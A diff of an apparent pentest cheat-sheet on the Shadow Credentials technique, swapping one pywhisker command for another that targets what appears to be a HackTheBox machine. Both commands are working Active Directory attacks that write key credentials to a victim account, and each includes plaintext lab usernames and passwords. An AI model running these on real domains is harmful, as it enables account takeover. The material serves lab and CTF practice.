@@ -32,14 +32,7 @@ Whisker.exe add /target:VictimUser /domain:warzone.oxsium.local /dc:192.168.0.19
 
 # PyWhisker
 ```powershell
-python3 /home/sako/Tools/pywhisker.py \
-  -d "warzone.oxsium.local" \
-  -u "ShadowOperator1" \
-  -p 'Oxsium_Lab123!' \
-  --target "VictimUser" \
-  --action "add" \
-  --dc-ip 192.168.0.199 \
-  --use-ldaps
+python3 Tools/pywhisker.py -d 'fluffy.htb' -u 'p.agila' -p 'prometheusx-303' --target 'ca_svc' --action add
 ```
 
 # Get TGT
